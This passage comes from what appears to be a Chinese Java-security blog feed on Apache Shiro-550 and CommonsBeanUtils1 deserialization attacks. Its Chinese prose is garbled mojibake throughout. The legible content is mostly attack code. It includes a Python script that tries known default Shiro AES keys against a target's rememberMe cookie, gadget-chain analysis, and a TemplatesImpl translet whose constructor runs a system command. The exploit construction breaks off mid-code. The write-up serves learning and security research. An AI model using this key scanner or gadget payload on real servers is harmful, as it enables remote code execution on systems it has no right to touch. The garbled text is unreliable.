ÈìæÊîªÂáª</h3><p>ËøòÊòØÁî®‰πãÂâçÁöÑCC11ÈìæÂ≠êÊîªÂáªÔºåÂÖàÂ∫èÂàóÂåñser.binÁÑ∂ÂêéÂä†ÂØÜÂèëÂåÖÂ∞±Ë°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171126559.png" alt="image-20230717112603459"></p><h3 id="ÈÄöËøá-CB1-ÈìæÊîªÂáª"><a href="#ÈÄöËøá-CB1-ÈìæÊîªÂáª" class="headerlink" title="ÈÄöËøá CB1 ÈìæÊîªÂáª"></a>ÈÄöËøá CB1 ÈìæÊîªÂáª</h3><p>ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØCBÁâàÊú¨ÈóÆÈ¢òÔºå‰∏ÄÂºÄÂßãÁî®ÁöÑexpÊòØ‰πãÂâçË∑üÁöÑCB1ËøôÊù°ÈìæÁöÑÊó∂ÂÄôÂÜôÁöÑÔºå‰ΩÜÊòØÈÇ£‰∏™CBÁâàÊú¨ÊòØ1.9.2Ôºåyso ‰∏≠ÁöÑÈìæÂ≠ê‰πüÊòØÔºåËÄåshiroËá™Â∏¶‰∏∫ 1.8.3ÔºåÊâÄ‰ª•ÈúÄË¶ÅÊääÁâàÊú¨Êõ¥Êç¢‰∏Ä‰∏ã‰∏çÁÑ∂ÊúçÂä°Á´ØÂ∞±Â•ΩÊä•Â¶Ç‰∏ãÈîôËØØ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.beanutils.BeanComparator; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2044202215314119608</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = -<span class="number">3490850999041592962</span></span><br></pre></td></tr></table></figure><p>Ëøô‰∏™<code>serialVersionUID</code>Â∞±ÊòØJavaÁöÑ‰∏Ä‰∏™Êú∫Âà∂ÔºåÂú®JavaÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊèê‰æõ‰∫Ü‰∏Ä‰∏™Êú∫Âà∂ÔºåÂ∫èÂàóÂåñÊó∂‰ºöÊ†πÊçÆÂõ∫ÂÆöÁÆóÊ≥ïËÆ°ÁÆóÂá∫‰∏Ä‰∏™ÂΩìÂâçÁ±ªÁöÑ <code>serialVersionUID</code> ÂÄºÔºåÂÜôÂÖ•Êï∞ÊçÆÊµÅ‰∏≠ÔºõÂèçÂ∫èÂàóÂåñÊó∂ÔºåÂ¶ÇÊûúÂèëÁé∞ÂØπÊñπÁöÑÁéØÂ¢É‰∏≠Ëøô‰∏™Á±ªËÆ°ÁÆóÂá∫ÁöÑ <code>serialVersionUID</code> ‰∏çÂêåÔºåÂàôÂèçÂ∫èÂàóÂåñÂ∞±‰ºöÂºÇÂ∏∏ÈÄÄÂá∫<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171126521.png" alt="image-20230717112620430"></p><h3 id="AESÂØÜÈí•Âà§Êñ≠"><a href="#AESÂØÜÈí•Âà§Êñ≠" class="headerlink" title="AESÂØÜÈí•Âà§Êñ≠"></a>AESÂØÜÈí•Âà§Êñ≠</h3><p>ËøôÈáåËøòÊúâ‰∏Ä‰∏™ÈóÆÈ¢òÂèÇËÄÉDrunkbabyÂ∏àÂÇÖÁöÑÊèèËø∞Â∞±ÊòØshiro Âú® 1.4.2 ÁâàÊú¨‰πãÂâçÔºå AES ÁöÑÊ®°Âºè‰∏∫ CBCÔºå IV ÊòØÈöèÊú∫ÁîüÊàêÁöÑÔºåÂπ∂‰∏î IV Âπ∂Ê≤°ÊúâÁúüÊ≠£‰ΩøÁî®Ëµ∑Êù•ÔºåÊâÄ‰ª•Êï¥‰∏™ AES Âä†Ëß£ÂØÜËøáÁ®ãÁöÑ key Â∞±ÂæàÈáçË¶Å‰∫ÜÔºåÊ≠£ÊòØÂõ†‰∏∫ AES ‰ΩøÁî® Key Ê≥ÑÊºèÂØºËá¥ÂèçÂ∫èÂàóÂåñÁöÑ cookie ÂèØÊéßÔºå‰ªéËÄåÂºïÂèëÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇÂú® 1.4.2 ÁâàÊú¨ÂêéÔºåshiro Â∑≤ÁªèÊõ¥Êç¢Âä†ÂØÜÊ®°Âºè AES-CBC ‰∏∫ AES-GCMÔºåËÑöÊú¨ÁºñÂÜôÊó∂Â∞±ÈúÄË¶ÅËÄÉËôëÂä†ÂØÜÊ®°ÂºèÂèòÂåñÁöÑÊÉÖÂÜµ„ÄÇËÆ∞Âæó‰πãÂâçÁî®ËøáÁöÑÈ£ûÈ∏øÂ§ß‰Ω¨ÁöÑ‰∏ÄÊ¨æshiroÂèçÂ∫èÂàóÂåñÂà©Áî®Â∑•ÂÖ∑Â∞±ÂÅö‰∫ÜkeyÁöÑÁàÜÁ†¥Ôºå‰∏ãÈù¢ÊòØÂ§ß‰Ω¨ Veraxy ÁöÑËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_AES_GCM</span>(<span class="params">msg, secretKey</span>):</span><br><span class="line">    aesCipher = AES.new(secretKey, AES.MODE_GCM)</span><br><span class="line">    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)</span><br><span class="line">    <span class="keyword">return</span> (ciphertext, aesCipher.nonce, authTag)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">target</span>):</span><br><span class="line">    keys = [<span class="string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="comment"># Ê≠§Â§ÑÁÆÄÂçïÂàó‰∏æÂá†‰∏™ÂØÜÈí•</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"> </span><br><span class="line">    file_body = base64.b64decode(<span class="string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># CBCÂä†ÂØÜ</span></span><br><span class="line">            encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Ê≠£Á°ÆKEY Ôºö&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Ê≠£Á°Ækey:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="comment"># GCMÂä†ÂØÜ</span></span><br><span class="line">            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))</span><br><span class="line">            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="number">1</span>] + encryptedMsg[<span class="number">0</span>] + encryptedMsg[<span class="number">2</span>])</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Ê≠£Á°ÆKEY:&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Ê≠£Á°Ækey:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Ê≠£Á°Ækey:&quot;</span> + key)</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p>ÂèÇËÄÉÔºö<br><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B%E4%B9%8B-deserialize-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">JavaÂèçÂ∫èÂàóÂåñShiroÁØá01-Shiro550ÊµÅÁ®ãÂàÜÊûê | Drunkbaby‚Äôs Blog (drun1baby.top)</a><br><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=fdbccecc8d1a39a2449860e47c52b6e7">ÁôΩÊó•Ê¢¶ÁªÑÈïø</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãCommonsBeanUtils1</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanUtils1/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanUtils1/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>jdk8<br>‰æùËµñÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.9</span><span class="number">.2</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-collections/commons-collections --&gt;  </span></span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-logging/commons-logging --&gt;  </span></span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-logging&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="CommonsBeanUtilsÁöÑÂ≠¶‰π†"><a href="#CommonsBeanUtilsÁöÑÂ≠¶‰π†" class="headerlink" title="CommonsBeanUtilsÁöÑÂ≠¶‰π†"></a>CommonsBeanUtilsÁöÑÂ≠¶‰π†</h2><p>commons-beanutils ÊòØ Apache Êèê‰æõÁöÑ‰∏Ä‰∏™Áî®‰∫éÊìç‰Ωú JavaBean ÁöÑÂ∑•ÂÖ∑ÂåÖ„ÄÇÈáåÈù¢Êèê‰æõ‰∫ÜÂêÑÁßçÂêÑÊ†∑ÁöÑÂ∑•ÂÖ∑Á±ªÔºåËÆ©Êàë‰ª¨ÂèØ‰ª•ÂæàÊñπ‰æøÁöÑÂØπ bean ÂØπË±°ÁöÑÂ±ûÊÄßËøõË°åÂêÑÁßçÊìç‰Ωú„ÄÇ<br>Âú®JavaBean‰∏≠Êàë‰ª¨ÈÄöÂ∏∏Êää‰∏ÄÁªÑÂØπÂ∫îÁöÑËØªÊñπÊ≥ïÔºà<code>getter</code>ÔºâÂíåÂÜôÊñπÊ≥ïÔºà<code>setter</code>ÔºâÁß∞‰∏∫Â±ûÊÄßÔºà<code>property</code>ÔºâÔºåÂÖ∑‰ΩìÁöÑÂ≠¶‰π†ÂèØ‰ª•ÂèÇËÄÉ<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean - ÂªñÈõ™Â≥∞ÁöÑÂÆòÊñπÁΩëÁ´ô (liaoxuefeng.com)</a><br>‰∏ãÈù¢ÊòØ‰∏™ÁÆÄÂçïÁöÑJavaBeanÁ±ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBean</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;y0n3er&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Commons-BeanUtils ‰∏≠Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÈùôÊÄÅÊñπÊ≥ï <code>PropertyUtils.getProperty</code> ÔºåËÆ©‰ΩøÁî®ËÄÖÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®‰ªªÊÑè JavaBean ÁöÑ getter ÊñπÊ≥ïÔºåÁ§∫‰æãÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        System.out.println(PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">JavaBean</span>(),<span class="string">&quot;name&quot;</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151118483.png" alt="image-20230715111849205"><br>ËøôÁßçË∞ÉÁî®ÊñπÊ≥ïCommons-BeanUtils ‰ºöËá™Âä®ÊâæÂà∞ name Â±ûÊÄßÁöÑgetter ÊñπÊ≥ïÔºå‰πüÂ∞±ÊòØ getName ÔºåÁÑ∂ÂêéË∞ÉÁî®Âπ∂Ëé∑ÂæóËøîÂõûÂÄºÔºåËøôÂ∞±ÂÆπÊòìÊÉ≥Âà∞‰ªªÊÑèÂáΩÊï∞Ë∞ÉÁî®</p><h2 id="CommonsBeanUtils1ÈìæÂ≠êÂàÜÊûê"><a href="#CommonsBeanUtils1ÈìæÂ≠êÂàÜÊûê" class="headerlink" title="CommonsBeanUtils1ÈìæÂ≠êÂàÜÊûê"></a>CommonsBeanUtils1ÈìæÂ≠êÂàÜÊûê</h2><p>ËøôÈáåËøòÊòØ‰ªéÂ∞æÈÉ®ÂàÜÊûêÔºåÊàëËøôÊ†∑ÊòØÊúÄÁÆÄÂçïÁöÑÔºåËøôÈáåÂêéÂçäÈÉ®ÂàÜÂíåCC4Á±ª‰ºº<br>Âú®‰πãÂâçÂä®ÊÄÅÂä†ËΩΩ TemplatesImpl Â≠óËäÇÁ†ÅÁöÑÂàÜÊûê‰∏≠ÈìæÂ≠êÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>Êàë‰ª¨ÂÜçÂæÄÂâçÊòØ<code>TemplatesImpl.getOutputProperties()</code>ÔºåÂÆÉÊòØ‰∏Ä‰∏™ getter ÊñπÊ≥ïÔºåÂπ∂‰∏î‰ΩúÁî®Âüü‰∏∫ publicÔºåÊâÄ‰ª•ÂèØ‰ª•ÈÄöËøá CommonsBeanUtils ‰∏≠ÁöÑ <code>PropertyUtils.getProperty()</code> ÊñπÂºèËé∑ÂèñÔºåÊñπÂºèÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(TemplatesImpl, <span class="string">&quot;outputProperties&quot;</span>)</span><br></pre></td></tr></table></figure><p>ËøôÈáåÁöÑTemplatesImplÂú®ÂÆûÈôÖË∞ÉÁî®ÁöÑÊó∂ÂÄôÂÖ∂ÂÆûÂ∞±ÊòØTemplatesImplÁöÑÂØπË±°ÔºåÁÑ∂ÂêéÊâæÂà∞outputPropertiesÂ±ûÊÄßÁöÑgetter ÊñπÊ≥ïÂç≥<code>getOutputProperties()</code>ÔºåÁÑ∂ÂêéÊåâÁÖßÊÉØ‰æãÁªßÁª≠ÂæÄÂâçË∑üÁúãË∞ÅË∞ÉÁî®‰∫Ü<code>PropertyUtils.getProperty()</code>ËøôÈáåfind usagesÁöÑÊó∂ÂÄô‰∏ÄÂÆöË¶ÅÊääÊ∫êÁ†Å‰∏ã‰∫ÜÔºå‰∏çÁÑ∂Êâæ‰∏çÂà∞ÔºåÊñπÂºèÂ∞±ÊòØËøõÂÖ•PropertyUtilsÁ±ª‰∏≠Ôºåidea‰ºöÊèêÁ§∫‰Ω†‰∏ãËΩΩÔºåÁÑ∂Âêé‰∏ãËΩΩÂ∞±Ë°å‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151119777.png" alt="image-20230715111957579"><br>ÊúÄÁªàÊâæÂà∞‰∫Ü<code>compare()</code>ÊñπÊ≥ïÔºåÁÑ∂ÂêéÂ∞±ÊòØÊâæË∞ÅË∞ÉÁî®‰∫ÜËøô‰∏™ÊñπÊ≥ïÔºå‰ΩÜÊòØË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÁöÑÁ±ªÂ∞±Â§™Â§ö‰∫ÜÔºåÊâÄ‰ª•Áõ¥Êé•Â∞±‰ªéÂ§ß‰Ω¨ÁöÑÂçöÂÆ¢Êê¨Â∞±Ë°å‰∫ÜÔºåÊúÄÁªàÊâæÂà∞ÁöÑÊòØ<code>PriorityQueue</code> Ëøô‰∏™Á±ªÁöÑ <code>siftDownUsingComparator()</code> ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151120222.png" alt="image-20230715112028044"><br>ÁÑ∂ÂêéÁªßÁª≠ÊâæË∞ÅË∞ÉÁî®‰∫Ü<code>siftDownUsingComparator()</code>ÔºåÂèëÁé∞Âú®ÂêåÁ±ª‰∏ãÁöÑ<code>siftDown()</code>‰∏≠Ë∞ÉÁî®‰∫ÜËøô‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151120382.png" alt="image-20230715112042190"><br>ÁÑ∂ÂêéÁªßÁª≠ÂæÄÂâçÊâæÂèëÁé∞ÂêåÁ±ª‰∏ãÁöÑ<code>heapify()</code>Ë∞ÉÁî®‰∫ÜËøô‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151121852.png" alt="image-20230715112129660"><br>ÁÑ∂ÂêéÁªßÁª≠ÊâæË∞ÅË∞ÉÁî®‰∫Ü<code>heapify()</code>ÊñπÊ≥ïÔºåÂèëÁé∞ÂêåÁ±ª‰∏ãÁöÑreadObject‰∏ãË∞ÉÁî®‰∫ÜÔºåËøôÂ∞±ÂíåCC4‰∏ÄÊ†∑ÔºåÈÇ£‰πàÂà∞ËøôÈáåÊï¥Êù°ÈìæÂ≠êÂ∞±ÁªìÊùü‰∫Ü</p><h2 id="EXPÁºñÂÜô"><a href="#EXPÁºñÂÜô" class="headerlink" title="EXPÁºñÂÜô"></a>EXPÁºñÂÜô</h2><p>Âú®<code>TemplatesImpl</code>Á±ª‰∏≠ËøòÊúâ‰∏™<code>TransletClassLoader</code>Á±ªÁªßÊâø‰∫Ü<code>ClassLoader</code>Á±ªÂπ∂‰∏îÈáçÂÜô‰∫Ü<code>defineClass()</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151121071.png" alt="image-20230715112155839"><br>ÁÑ∂ÂêéÊàë‰ª¨‰ªé<code>TransletClassLoader#defineClass()</code> ÂêëÂâçËøΩÊ∫Ø‰∏Ä‰∏ãË∞ÉÁî®ÈìæÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line"></span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line"></span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p><code>TemplatesImpl#getOutputProperties()</code> Âíå <code>TemplatesImpl#newTransformer()</code> ÔºåËøô‰∏§ËÄÖÁöÑ‰ΩúÁî®ÂüüÊòØpublicÔºåÂèØ‰ª•Ë¢´Â§ñÈÉ®Ë∞ÉÁî®ÔºåÊàë‰ª¨Â∞ùËØïÁî® <code>TemplatesImpl#newTransformer()</code> ÊûÑÈÄ†‰∏Ä‰∏™ÁÆÄÂçïÁöÑ exp<br>È¶ñÂÖàÊûÑÈÄ†Â≠óËäÇÁ†ÅÔºåËøôÈáåÁöÑÂ≠óËäÇÁ†ÅÂøÖÈ°ªÁªßÊâø<code>AbstractTranslet</code>ÔºåÂõ†‰∏∫ÁªßÊâø‰∫ÜËøô‰∏ÄÊäΩË±°Á±ªÔºåÊâÄ‰ª•ÂøÖÈ°ªË¶ÅÈáçÂÜô‰∏Ä‰∏ãÈáåÈù¢ÁöÑÊñπÊ≥ïÔºåËøôÈáåÁõ¥Êé•ÂÄüÁî®Â§ß‰Ω¨ÁöÑÂ≠óËäÇÁ†Å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// TemplatesImpl ÁöÑÂ≠óËäÇÁ†ÅÊûÑÈÄ†  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesBytes</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesBytes</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;  </span><br><span class="line">        <span class="built_in">super</span>();  </span><br><span class="line"> Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Â≠óËäÇÁ†ÅÁªìÊùüÔºåÊé•‰∏ãÊù•Â∞±ÊòØÊûÑÈÄ†expÔºåÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">  </span><br><span class="line"><span 